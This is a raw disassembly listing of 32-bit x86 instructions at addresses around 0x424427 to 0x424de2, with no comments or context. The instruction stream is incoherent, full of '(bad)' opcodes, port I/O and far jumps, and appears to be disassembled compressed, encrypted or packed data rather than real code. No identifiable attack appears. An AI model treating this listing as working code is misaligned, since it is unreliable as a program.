  424427:	mov    edi,0x4398fe1e
  42442c:	out    dx,eax
  42442d:	adc    al,al
  42442f:	dec    ecx
  424430:	int    0xa5
  424432:	lds    edx,FWORD PTR [ebp+0x1f66ba54]
  424438:	pop    ds
  424439:	lahf   
  42443a:	and    bh,bh
  42443c:	xor    eax,0x30f014c7
  424441:	mov    ecx,ebx
  424443:	sub    al,ah
  424445:	add    DWORD PTR [eax+0x51],ebx
  424448:	mov    ch,0x53
  42444a:	mov    esp,DWORD PTR [eax]
  42444c:	mov    bl,0x63
  42444e:	inc    esi
  42444f:	sub    al,0x92
  424451:	lods   al,BYTE PTR ds:[esi]
  424452:	push   es
  424453:	lahf   
  424454:	jle    0x424479
  424456:	daa    
  424457:	lods   eax,DWORD PTR ds:[esi]
  424458:	mov    edx,0x6c8c8015
  42445d:	iret   
  42445e:	cmp    dl,BYTE PTR [edi+0x16b722b9]
  424464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424465:	pop    ss
  424466:	pop    ss
  424467:	sub    esi,eax
  424469:	dec    eax
  42446a:	das    
  42446b:	lea    esp,[eax+0x70f489d5]
  424471:	xor    eax,0xbb9def66
  424476:	lods   eax,DWORD PTR ds:[esi]
  424477:	shl    BYTE PTR [eax+0x3f],0x63
  42447b:	sub    esp,DWORD PTR [edi+eax*2+0x5f]
  42447f:	scas   eax,DWORD PTR es:[edi]
  424480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424481:	mov    eax,ds:0xf935cce2
  424486:	and    eax,0xdda0323d
  42448b:	push   eax
  42448c:	iret   
  42448d:	(bad)  
  42448f:	mov    eax,0xee75fb86
  424494:	(bad)  
  424495:	xchg   ebx,eax
  424496:	pusha  
  424497:	jp     0x424451
  424499:	test   BYTE PTR ds:0x951cb623,ch
  42449f:	push   esi
  4244a0:	push   ebx
  4244a1:	cli    
  4244a2:	dec    bx
  4244a4:	or     bl,BYTE PTR [ebp+0x30]
  4244a7:	icebp  
  4244a8:	jns    0x4244c6
  4244aa:	imul   DWORD PTR [ecx+0x7]
  4244ad:	pushf  
  4244ae:	cmp    edx,edx
  4244b0:	inc    eax
  4244b1:	jg     0x4244a1
  4244b3:	dec    ebx
  4244b4:	cdq    
  4244b5:	mov    bh,0x2
  4244b7:	add    al,0xa1
  4244b9:	inc    edi
  4244ba:	push   edi
  4244bb:	ins    BYTE PTR es:[edi],dx
  4244bc:	pusha  
  4244bd:	xchg   edi,eax
  4244be:	fwait
  4244bf:	and    DWORD PTR [ecx+0x39b9d217],eax
  4244c5:	in     eax,dx
  4244c6:	lods   al,BYTE PTR ds:[esi]
  4244c7:	into   
  4244c8:	jbe    0x4244f0
  4244ca:	popa   
  4244cb:	inc    edi
  4244cc:	dec    eax
  4244cd:	stos   BYTE PTR es:[edi],al
  4244ce:	mov    esp,0xfb7143c2
  4244d3:	jnp    0x424527
  4244d5:	dec    edx
  4244d6:	scas   eax,DWORD PTR es:[edi]
  4244d7:	add    BYTE PTR [ebx-0x7f469f84],bl
  4244dd:	popf   
  4244de:	jbe    0x42451c
  4244e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244e1:	jp     0x424499
  4244e3:	jnp    0x424519
  4244e5:	popa   
  4244e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244e7:	cmp    eax,0x6a0e89f6
  4244ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ed:	adc    al,0x47
  4244ef:	push   esi
  4244f0:	ins    DWORD PTR es:[edi],dx
  4244f1:	aaa    
  4244f2:	pop    es
  4244f3:	inc    edx
  4244f4:	cmp    al,0x17
  4244f6:	aas    
  4244f7:	cmp    eax,0xc57e3452
  4244fc:	cmp    eax,0x1281df37
  424501:	dec    ebp
  424502:	adc    DWORD PTR [eax],ebp
  424504:	push   edx
  424505:	imul   esp,esp,0xffffffc5
  424508:	ds addr16 ret 
  42450b:	adc    eax,0x66a0f1a1
  424510:	mov    BYTE PTR [eax],al
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x5a],1
  424581:	clc    
  424582:	jp     0x424506
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0x2b000001,al
  42458d:	aam    0x9d
  42458f:	inc    edx
  424590:	in     al,dx
  424591:	push   edi
  424592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424593:	iret   
  424594:	iret   
  424595:	inc    edx
  424596:	call   0xec1:0x30a62679
  42459d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42459e:	shl    BYTE PTR [edi+0x13],0x33
  4245a2:	dec    ebp
  4245a3:	cmp    DWORD PTR [ecx+0x7af00f84],ebp
  4245a9:	inc    ebx
  4245aa:	popf   
  4245ab:	dec    edx
  4245ac:	popaw  
  4245ae:	shl    dl,cl
  4245b0:	push   ebp
  4245b1:	mov    esi,0xa540c597
  4245b6:	out    dx,al
  4245b7:	pop    ss
  4245b8:	adc    esi,ecx
  4245ba:	dec    esi
  4245bb:	test   DWORD PTR [edx+0x5e69b57c],ebp
  4245c1:	arpl   sp,ax
  4245c3:	push   ecx
  4245c4:	mov    DWORD PTR [edx+0x19],ecx
  4245c7:	cs pop ebp
  4245c9:	sti    
  4245ca:	mov    ds:0x30e42a7,eax
  4245cf:	or     esp,DWORD PTR [edi]
  4245d1:	xchg   ebp,eax
  4245d2:	shl    DWORD PTR cs:[ecx-0x14],1
  4245d6:	repnz pop es
  4245d8:	adc    DWORD PTR [ebp+esi*8+0x36964d56],ecx
  4245df:	pop    esp
  4245e0:	stos   DWORD PTR es:[di],eax
  4245e2:	jbe    0x4245c6
  4245e4:	or     ecx,edi
  4245e6:	imul   edi,DWORD PTR [edx],0xe862f720
  4245ec:	rcl    DWORD PTR [esi-0x3eb64e2a],cl
  4245f2:	xlat   BYTE PTR ds:[ebx]
  4245f3:	lahf   
  4245f4:	jg     0x42460c
  4245f6:	ror    esi,0xbf
  4245f9:	dec    ebp
  4245fa:	adc    al,0x43
  4245fc:	add    al,0xc0
  4245fe:	dec    esi
  4245ff:	pop    ecx
  424600:	test   eax,0x4f0acc1d
  424605:	cld    
  424606:	lock test BYTE PTR [esi-0x39938a71],bl
  42460d:	mov    edi,cr6
  424610:	mov    ebx,0x2edb9ef4
  424615:	dec    eax
  424616:	outs   dx,DWORD PTR ds:[esi]
  424617:	mov    ch,0x38
  424619:	push   esp
  42461a:	das    
  42461b:	sbb    DWORD PTR [edi+0x57e65c74],eax
  424621:	aaa    
  424622:	and    eax,edx
  424624:	mov    BYTE PTR [edi+0x41],ch
  424627:	push   0x28
  424629:	(bad)  
  42462a:	(bad)  
  42462b:	in     eax,0xe5
  42462d:	call   0x26b8:0xc58652f5
  424634:	repnz jecxz 0x424624
  424637:	push   esp
  424638:	xchg   edx,eax
  424639:	pop    edi
  42463a:	popa   
  42463b:	xchg   edi,eax
  42463c:	sahf   
  42463d:	push   0x1f
  42463f:	push   ecx
  424640:	aas    
  424641:	add    eax,0xef01961c
  424646:	aad    0x24
  424648:	jmp    0x6d7e:0x68de0bb2
  42464f:	add    DWORD PTR [edi+ecx*2+0x68593ad8],0xffffff88
  424657:	loopne 0x424671
  424659:	adc    DWORD PTR [edx],ecx
  42465b:	jno    0x424652
  42465d:	ss fwait
  42465f:	aad    0xba
  424661:	popf   
  424662:	int    0xdd
  424664:	add    eax,0xc8755a52
  424669:	inc    eax
  42466a:	sub    eax,0x9f96a174
  42466f:	and    BYTE PTR [esi-0x3d],dl
  424672:	xchg   esp,eax
  424673:	cmp    DWORD PTR [edi-0x78],edx
  424676:	cmp    BYTE PTR [edi],dl
  424678:	mov    fs,WORD PTR [eax+0x53]
  42467b:	shl    BYTE PTR [eax+0x49fe5e7d],0x0
  424682:	aas    
  424683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424684:	aas    
  424685:	out    dx,al
  424686:	cwde   
  424687:	xchg   BYTE PTR [eax],bl
  424689:	dec    edx
  42468a:	jl     0x4246e8
  42468c:	jmp    0x0:0x9c7c4301
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [esi],bl
  424701:	loopne 0x4246b5
  424703:	sub    ecx,DWORD PTR [ebp+eax*4+0x1]
  424707:	add    BYTE PTR ds:0xd5000001,al
  42470d:	dec    ebx
  42470e:	mov    bh,0xdb
  424710:	out    0x59,eax
  424712:	cli    
  424713:	lock out dx,eax
  424715:	fbld   TBYTE PTR [esi-0x62106e59]
  42471b:	jmp    0x424754
  42471d:	inc    edx
  42471e:	outs   dx,DWORD PTR ds:[esi]
  42471f:	xor    ebx,DWORD PTR [edx+0x6d]
  424722:	cwde   
  424723:	in     al,0x56
  424725:	mov    BYTE PTR [eax],0x7b
  424728:	jmp    0x42470f
  42472a:	es (bad) 
  42472c:	enter  0x1467,0x34
  424730:	loopne 0x4246cb
  424732:	mov    edi,0xe91038ac
  424737:	lock or dl,dh
  42473a:	bound  edi,QWORD PTR [esi-0x5c]
  42473d:	test   eax,0x41a79fc0
  424742:	xchg   edx,eax
  424743:	popf   
  424744:	jge    0x4246c9
  424746:	add    eax,0x13f7968c
  42474b:	mov    bl,0xbb
  42474d:	cmovne edx,DWORD PTR ds:0x20b3647
  424754:	adc    eax,0x2d9245b0
  424759:	outs   dx,BYTE PTR ds:[esi]
  42475a:	jnp    0x4247b0
  42475c:	cmp    BYTE PTR [esi+0x1e],dl
  42475f:	sbb    DWORD PTR [edi-0x5f],edx
  424762:	aas    
  424763:	mov    ecx,0xe99c4384
  424768:	adc    dh,0x76
  42476b:	data16 fdiv QWORD PTR [edx-0x77]
  42476f:	das    
  424770:	dec    esi
  424771:	push   ebx
  424772:	jle    0x42476f
  424774:	ins    BYTE PTR es:[edi],dx
  424775:	jl     0x4247dd
  424777:	retf   0xe954
  42477a:	mov    bh,BYTE PTR [edi-0x1]
  42477d:	in     al,dx
  42477e:	mov    esp,0xb3ebf31c
  424783:	mov    edx,0xbef1e7cf
  424788:	call   0xa4ad:0xad871f97
  42478f:	into   
  424790:	push   0x188795c5
  424795:	(bad)  
  424796:	and    DWORD PTR [eax-0x61],ecx
  424799:	mov    ds:0xcaba4643,al
  42479e:	mov    ch,0x87
  4247a0:	test   DWORD PTR [edx-0x49],esp
  4247a3:	leave  
  4247a4:	addr16 dec edx
  4247a6:	ficomp DWORD PTR [ebx-0x22f05b17]
  4247ac:	stc    
  4247ad:	int    0x9f
  4247af:	adc    DWORD PTR [eax+0x21],ecx
  4247b2:	and    ecx,DWORD PTR [edi-0x56]
  4247b5:	pop    ds
  4247b6:	xor    bl,BYTE PTR [ecx-0x2385a0d2]
  4247bc:	inc    ecx
  4247bd:	test   DWORD PTR [edx-0xc58044f],0x1a468aa5
  4247c7:	jle    0x4247fa
  4247c9:	xor    eax,0xde915878
  4247ce:	jle    0x4247b3
  4247d0:	sbb    ebp,edi
  4247d2:	mov    edx,0xc1afa843
  4247d7:	(bad)  
  4247d8:	repnz sub bh,bl
  4247db:	mov    WORD PTR [ecx-0x41],fs
  4247de:	dec    eax
  4247df:	inc    ecx
  4247e0:	push   cs
  4247e1:	imul   BYTE PTR [eax]
  4247e3:	out    dx,eax
  4247e4:	sbb    eax,0x266cdd93
  4247e9:	mov    edi,DWORD PTR [ebx]
  4247eb:	f2xm1  
  4247ed:	jne    0x42481c
  4247ef:	mov    esp,0xf0559348
  4247f4:	sbb    al,0x62
  4247f6:	in     eax,dx
  4247f7:	or     al,0xe8
  4247f9:	pop    es
  4247fa:	inc    edx
  4247fb:	ret    0x8b6d
  4247fe:	fucomip st,st(0)
  424800:	or     al,0x70
  424802:	retf   
  424803:	xchg   esp,eax
  424804:	retf   0xa816
  424807:	push   edi
  424808:	aaa    
  424809:	je     0x4247fc
  42480b:	xor    BYTE PTR [eax],0x4
  42480e:	inc    eax
  42480f:	xchg   BYTE PTR [ecx+0x0],ch
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	fldcw  WORD PTR [ebp+ebx*1-0x72]
  424884:	push   ecx
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0xf6000001,al
  42488d:	mov    cl,0x93
  42488f:	jmp    0x42484e
  424891:	lock test al,0xcb
  424894:	pop    edx
  424895:	ins    BYTE PTR es:[edi],dx
  424896:	mov    cl,0x74
  424898:	dec    edi
  424899:	rcl    BYTE PTR [esi+0x25],0xdd
  42489d:	retf   
  42489e:	outs   dx,BYTE PTR ds:[esi]
  42489f:	sub    al,0xa9
  4248a1:	daa    
  4248a2:	mov    edx,0xbba705e
  4248a7:	les    edi,FWORD PTR [edi-0x406c6f64]
  4248ad:	dec    eax
  4248ae:	jbe    0x424886
  4248b0:	lods   al,BYTE PTR ds:[esi]
  4248b1:	sub    eax,0x26cb342b
  4248b6:	xchg   edx,eax
  4248b7:	cmp    cl,BYTE PTR [esi+0x6a74b662]
  4248bd:	cmp    eax,0x44f87d73
  4248c2:	add    edx,edx
  4248c4:	or     ebp,edx
  4248c6:	fist   DWORD PTR [esi+0x75]
  4248c9:	ds jmp 0x42487d
  4248cc:	je     0x424948
  4248ce:	pusha  
  4248cf:	push   edx
  4248d0:	ds inc ebp
  4248d2:	mov    bh,0xa
  4248d4:	ds or  dl,cl
  4248d7:	pop    ebp
  4248d8:	mov    cl,0x32
  4248da:	and    al,0x9
  4248dc:	int    0x11
  4248de:	dec    eax
  4248df:	popa   
  4248e0:	adc    DWORD PTR [edi],ebx
  4248e2:	mov    al,0xc7
  4248e4:	mov    al,0xb
  4248e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248e7:	mov    ebp,0x47ae2033
  4248ec:	or     al,0x76
  4248ee:	jae    0x424943
  4248f0:	add    BYTE PTR [esp+edi*4],cl
  4248f3:	lea    ecx,[edx-0x1a1a59db]
  4248f9:	test   bh,bh
  4248fb:	int    0xdc
  4248fd:	pushf  
  4248fe:	cmp    al,0xc3
  424900:	and    al,dl
  424902:	inc    ebp
  424903:	sub    DWORD PTR [eax-0x4],esi
  424906:	retf   
  424907:	xlat   BYTE PTR ds:[ebx]
  424908:	pusha  
  424909:	rcr    DWORD PTR [eax+edi*4-0x52dee5fa],cl
  424910:	cmp    dl,dh
  424912:	xchg   ecx,eax
  424913:	inc    ebp
  424914:	push   fs
  424916:	mov    bl,0xcc
  424918:	in     eax,dx
  424919:	popa   
  42491a:	push   ss
  42491b:	cs jae 0x424969
  42491e:	sti    
  42491f:	aas    
  424920:	lods   al,BYTE PTR ds:[esi]
  424921:	(bad)  
  424922:	jnp    0x42499d
  424924:	mov    dl,0x6
  424926:	mov    bh,0xb0
  424928:	(bad)  
  424929:	int    0x1b
  42492b:	push   0x25fa1f19
  424930:	int    0x77
  424932:	xor    DWORD PTR [eax],ecx
  424934:	jno    0x4249ae
  424936:	inc    eax
  424937:	in     al,dx
  424938:	(bad)  
  424939:	mov    al,ds:0x43378d9
  42493e:	adc    cl,BYTE PTR [ebp-0x18]
  424941:	sbb    dl,bh
  424943:	aad    0x7
  424945:	inc    edi
  424946:	sub    DWORD PTR [edi+0x84e6ed4],ebp
  42494c:	fidiv  WORD PTR [edi*1-0x27b9d97f]
  424953:	pop    esi
  424954:	push   ds
  424955:	cmp    DWORD PTR [ecx-0x1],ebx
  424958:	xchg   DWORD PTR [ebx+eax*8-0x18],edi
  42495c:	leave  
  42495d:	js     0x424986
  42495f:	in     eax,0x55
  424961:	dec    esi
  424962:	mov    eax,ds:0x1483efca
  424967:	(bad)  
  424968:	xchg   edx,eax
  424969:	inc    eax
  42496a:	mov    esp,ebp
  42496c:	xor    DWORD PTR [edi],eax
  42496e:	mov    al,0x43
  424970:	jge    0x4249b8
  424972:	inc    edx
  424973:	mov    BYTE PTR [ebx-0x6af0d841],dl
  424979:	sub    al,0x72
  42497b:	inc    ebp
  42497c:	add    al,0x17
  42497e:	bound  esi,QWORD PTR [eax+edi*1+0x4c]
  424982:	mov    dh,dh
  424984:	lea    ecx,[esi]
  424986:	inc    edx
  424987:	xchg   ecx,eax
  424988:	add    BYTE PTR [edx+0xd],0x4
  42498c:	jecxz  0x424915
  42498e:	cmp    BYTE PTR [eax+0x3d],0x0
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dh,BYTE PTR [ecx+ebx*1-0x78a9dbf7]
  424a06:	add    DWORD PTR [eax],eax
  424a08:	add    eax,0x5b000001
  424a0d:	adc    DWORD PTR [edx+0x39],0xffffffa5
  424a11:	outs   dx,DWORD PTR gs:[esi]
  424a13:	popf   
  424a14:	pop    ss
  424a15:	cmp    BYTE PTR [esp+ebx*2+0x48b80ca5],0x3e
  424a1d:	mul    ecx
  424a1f:	pop    edi
  424a20:	test   edx,esi
  424a22:	cmc    
  424a23:	mov    ds:0xda0f2feb,eax
  424a28:	ret    0x126a
  424a2b:	adc    al,0x19
  424a2d:	pop    eax
  424a2e:	loope  0x424a03
  424a30:	out    0x5e,al
  424a32:	sub    ebx,DWORD PTR [edx]
  424a34:	ins    BYTE PTR es:[edi],dx
  424a35:	(bad)  
  424a37:	dec    edi
  424a38:	jg     0x4249ba
  424a3a:	stc    
  424a3b:	ins    DWORD PTR es:[di],dx
  424a3d:	mov    bl,0xf8
  424a3f:	out    0xeb,eax
  424a41:	test   BYTE PTR [esi-0x6f],dh
  424a44:	mov    WORD PTR [ebp+0x6b],es
  424a47:	test   eax,0x6910d9ea
  424a4c:	mov    bh,0x2d
  424a4e:	add    al,0xc6
  424a50:	fsubr  DWORD PTR [ebx+eiz*1-0x26]
  424a54:	leave  
  424a55:	push   esi
  424a56:	pop    edi
  424a57:	push   esi
  424a58:	mov    esi,0xc7dbbb4d
  424a5d:	lds    edx,FWORD PTR [eax+0x3d]
  424a60:	jmp    0x5042a630
  424a65:	scas   eax,DWORD PTR es:[edi]
  424a66:	push   ss
  424a67:	add    esp,esi
  424a69:	inc    eax
  424a6a:	jg     0x424aca
  424a6c:	jg     0x4249fa
  424a6e:	retf   
  424a6f:	(bad)  
  424a70:	adc    ebx,DWORD PTR [edi+edi*2]
  424a73:	mov    esi,0x5d53f3a2
  424a78:	adc    eax,0x4fb7eb56
  424a7d:	mov    al,0xdb
  424a7f:	dec    esp
  424a80:	cmp    DWORD PTR [esi],edx
  424a82:	lds    esp,FWORD PTR es:[esp+edx*8]
  424a86:	stos   BYTE PTR es:[edi],al
  424a87:	data16 mov dh,0xbc
  424a8a:	in     al,0x11
  424a8c:	xchg   esp,eax
  424a8d:	pusha  
  424a8e:	push   esi
  424a8f:	xor    al,0xf1
  424a91:	lea    ebp,[ecx-0x3f]
  424a94:	lea    eax,[eax]
  424a96:	ins    DWORD PTR es:[edi],dx
  424a97:	pop    ecx
  424a98:	(bad)  
  424a99:	es sub eax,0xbe2a3f0e
  424a9f:	and    bh,BYTE PTR [eax+0x67]
  424aa2:	stc    
  424aa3:	test   eax,0x64731e50
  424aa8:	mov    cl,0x93
  424aaa:	xchg   edx,eax
  424aab:	out    dx,al
  424aac:	or     al,0x25
  424aae:	in     al,dx
  424aaf:	sbb    bh,bl
  424ab1:	push   eax
  424ab2:	clc    
  424ab3:	add    eax,0x63331607
  424ab8:	sub    eax,0xfc2dd1e5
  424abd:	ret    
  424abe:	mov    ds:0xb546a48d,al
  424ac3:	mov    dl,0x32
  424ac5:	mov    dh,0xa0
  424ac7:	push   edx
  424ac8:	fs in  al,0x7c
  424acb:	pusha  
  424acc:	(bad)  
  424acd:	in     al,dx
  424ace:	mov    bl,0xca
  424ad0:	nop
  424ad1:	idiv   ah
  424ad3:	adc    BYTE PTR [esi+0x75],bh
  424ad6:	cli    
  424ad7:	in     eax,0x8
  424ad9:	mov    dh,0xb4
  424adb:	xor    DWORD PTR [eax],edx
  424add:	add    al,0xae
  424adf:	loopne 0x424b5b
  424ae1:	xor    DWORD PTR [edx],edi
  424ae3:	push   ds
  424ae4:	mov    bl,0x97
  424ae6:	ficomp WORD PTR [esi]
  424ae8:	mov    al,ds:0xf2c00eae
  424aed:	add    ch,ah
  424aef:	icebp  
  424af0:	sahf   
  424af1:	jae    0x424b32
  424af3:	ss inc esi
  424af5:	add    BYTE PTR [edi-0x14],bl
  424af8:	dec    ebx
  424af9:	loopne 0x424aad
  424afb:	sbb    DWORD PTR [eax+0x2e3dd2c6],edx
  424b01:	or     al,0x73
  424b03:	push   ebp
  424b04:	push   esi
  424b05:	mov    ebp,0x356e16cf
  424b0a:	inc    edx
  424b0b:	cmp    DWORD PTR [ecx+edi*2+0x66],ebx
  424b0f:	jne    0x424af6
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	icebp  
  424b81:	xchg   edx,eax
  424b82:	(bad)  
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x3a000001,al
  424b8d:	repnz cmc 
  424b8f:	or     al,0x63
  424b91:	aas    
  424b92:	mov    ch,0x13
  424b94:	in     al,dx
  424b95:	add    BYTE PTR [eax+ebx*1],ah
  424b98:	ror    ebp,cl
  424b9a:	lock in eax,0x1f
  424b9d:	xchg   edi,eax
  424b9e:	xchg   ebp,eax
  424b9f:	pop    ecx
  424ba0:	mov    bh,0x65
  424ba2:	push   esi
  424ba3:	loop   0x424b46
  424ba5:	pop    es
  424ba6:	mov    esi,0xe3b2d1c3
  424bab:	jle    0x424b9c
  424bad:	js     0x424b81
  424baf:	rcr    ch,cl
  424bb1:	pop    ebx
  424bb2:	sub    DWORD PTR [ebp+0xa],ebp
  424bb5:	retf   
  424bb6:	mov    cs,WORD PTR [ecx+0x74]
  424bb9:	pop    eax
  424bba:	int    0xfb
  424bbc:	jmp    0x1015:0x62c2661b
  424bc3:	loope  0x424c10
  424bc5:	adc    ebx,DWORD PTR [ecx-0x18]
  424bc8:	adc    BYTE PTR [esi+eax*4+0x1d],cl
  424bcc:	or     DWORD PTR [ebx-0x3c86fe66],edx
  424bd2:	xor    esi,DWORD PTR [ebx]
  424bd4:	fsub   QWORD PTR [esi+0x51]
  424bd7:	sub    dh,cl
  424bd9:	ficomp WORD PTR ds:0x13d3cfd9
  424bdf:	xchg   esp,eax
  424be0:	icebp  
  424be1:	mov    bh,0x46
  424be3:	push   edx
  424be4:	push   0xffffffe0
  424be6:	inc    esi
  424be7:	dec    esi
  424be8:	enter  0xdcf3,0x7f
  424bec:	mov    cl,0xd9
  424bee:	imul   ebp,esp,0x68
  424bf1:	cmovae esp,ebx
  424bf4:	cmp    al,bh
  424bf6:	dec    ebp
  424bf7:	int3   
  424bf8:	mov    DWORD PTR [eax-0x6e],ebp
  424bfb:	(bad)  
  424bfd:	sahf   
  424bfe:	or     esi,ecx
  424c00:	jnp    0x424bf9
  424c02:	cli    
  424c03:	outs   dx,BYTE PTR ds:[esi]
  424c04:	test   bh,al
  424c06:	push   0xffffffba
  424c08:	pop    eax
  424c09:	sub    eax,0x6d6e2
  424c0e:	ret    
  424c0f:	jne    0x424c5d
  424c11:	mov    al,0x15
  424c13:	pop    ss
  424c14:	sahf   
  424c15:	sub    BYTE PTR [edx+edx*8-0x15],cl
  424c19:	out    dx,al
  424c1a:	inc    esi
  424c1b:	loope  0x424ba9
  424c1d:	repnz xchg dh,al
  424c20:	mov    bl,0xb4
  424c22:	jnp    0x424c05
  424c24:	inc    esi
  424c25:	sub    ah,BYTE PTR [eax]
  424c27:	pop    ss
  424c28:	xor    esi,DWORD PTR [esi+ecx*8-0x75]
  424c2c:	lods   eax,DWORD PTR ds:[esi]
  424c2d:	shl    cl,cl
  424c2f:	loopne 0x424bbb
  424c31:	push   ds
  424c32:	stc    
  424c33:	das    
  424c34:	clc    
  424c35:	rcr    ch,cl
  424c37:	mov    ecx,0xc2dea422
  424c3c:	jns    0x424cb2
  424c3e:	cs push edi
  424c40:	or     bh,cl
  424c42:	pop    esi
  424c43:	cld    
  424c44:	sbb    BYTE PTR [ecx+0x3c2ea72b],cl
  424c4a:	retf   0xb888
  424c4d:	sub    BYTE PTR [edi+0x5a],ch
  424c50:	jnp    0x424c69
  424c52:	push   eax
  424c53:	rcr    BYTE PTR [ebp+0x1c768619],0xf3
  424c5a:	mov    al,0x98
  424c5c:	out    0xd5,eax
  424c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c5f:	adc    BYTE PTR ds:0xfabf41f,0x1f
  424c66:	lds    ecx,FWORD PTR [edi-0x5d]
  424c69:	clc    
  424c6a:	dec    eax
  424c6b:	(bad)  
  424c6c:	mov    esi,0xb98d07cd
  424c71:	scas   eax,DWORD PTR es:[edi]
  424c72:	fdiv   st(7),st
  424c74:	stc    
  424c75:	and    al,BYTE PTR [esi-0x2e126ada]
  424c7b:	lods   eax,DWORD PTR ds:[esi]
  424c7c:	add    BYTE PTR [ebp-0x630ddf08],dh
  424c82:	fwait
  424c83:	jmp    0xf4ca5e03
  424c88:	xor    eax,DWORD PTR [edi]
  424c8a:	push   cs
  424c8b:	mov    cl,0xa
  424c8d:	shr    DWORD PTR [esi],1
  424c8f:	popa   
  424c90:	nop
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	sahf   
  424d01:	test   DWORD PTR [ecx],edx
  424d03:	and    DWORD PTR [eax-0x77],0x1050001
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	jno    0x424cb1
  424d0e:	test   al,0x3d
  424d10:	inc    ebx
  424d11:	xor    DWORD PTR [edi],edi
  424d13:	outs   dx,DWORD PTR ds:[esi]
  424d14:	mov    ch,0xd4
  424d16:	and    edx,DWORD PTR [ebx-0xb389263]
  424d1c:	adc    eax,0xb7dc7088
  424d21:	mov    ds:0xf4148ffa,al
  424d26:	data16 jno 0x424d09
  424d29:	cmp    eax,0xf9fd8f9f
  424d2e:	push   ds
  424d2f:	shl    DWORD PTR [ebx+0xe],0x20
  424d33:	vmaxps ymm3,ymm2,ymm6
  424d37:	in     eax,0x77
  424d39:	js     0x424da8
  424d3b:	leavew 
  424d3d:	mov    esp,0xe4a73dfb
  424d42:	loopne 0x424d96
  424d44:	std    
  424d45:	push   ebp
  424d46:	cmp    cl,BYTE PTR [edx]
  424d48:	out    dx,al
  424d49:	mov    edx,0x95083894
  424d4e:	mov    ch,0xb0
  424d50:	loope  0x424dab
  424d52:	int    0x6f
  424d54:	(bad)  
  424d55:	fsub   QWORD PTR [eax-0x44]
  424d58:	jnp    0x424d3a
  424d5a:	stc    
  424d5b:	rcl    esp,cl
  424d5d:	or     al,BYTE PTR [ebx+0x17860d9c]
  424d63:	idiv   BYTE PTR [esi+0x7a]
  424d66:	or     al,BYTE PTR [ebx+0x2d11423c]
  424d6c:	add    eax,0xa299a67a
  424d71:	test   BYTE PTR [edi-0xf],ah
  424d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d75:	jmp    0x93fefa74
  424d7a:	push   esi
  424d7b:	cdq    
  424d7c:	pusha  
  424d7d:	jecxz  0x424d5a
  424d7f:	aas    
  424d80:	in     al,dx
  424d81:	jae    0x424d24
  424d83:	jg     0x424d7d
  424d85:	aaa    
  424d86:	popa   
  424d87:	jge    0x424d6c
  424d89:	stc    
  424d8a:	pop    ds
  424d8b:	dec    ecx
  424d8c:	dec    eax
  424d8d:	aad    0xf4
  424d8f:	test   cl,0x34
  424d92:	rep ins DWORD PTR es:[edi],dx
  424d94:	and    ah,BYTE PTR [edi+0x2397f800]
  424d9a:	ins    DWORD PTR es:[edi],dx
  424d9b:	push   esi
  424d9c:	cmp    DWORD PTR [eax-0x2f],edi
  424d9f:	call   0xe6af:0xb31b607d
  424da6:	ror    DWORD PTR [esi-0x784ade2],0xd8
  424dad:	mov    gs:0x7ceb65fe,eax
  424db3:	popf   
  424db4:	mov    WORD PTR [eax-0x6a],fs
  424db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424db9:	xlat   BYTE PTR ds:[ebx]
  424dba:	mov    eax,0x204b6166
  424dbf:	mov    dl,0x53
  424dc1:	sub    DWORD PTR ds:0x61ca35c3,ecx
  424dc7:	xor    DWORD PTR [eax-0x1a4f3fe8],esp
  424dcd:	pop    ebx
  424dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dcf:	jecxz  0x424df7
  424dd1:	adc    bh,BYTE PTR [ebx+0x3e]
  424dd4:	or     BYTE PTR [esi+0x58],bh
  424dd7:	inc    esi
  424dd8:	jg     0x424dd4
  424dda:	jmp    FWORD PTR [eax+0x6f3233da]
  424de0:	in     al,0x8d
  424de2:	(bad)  [ecx+0x78]
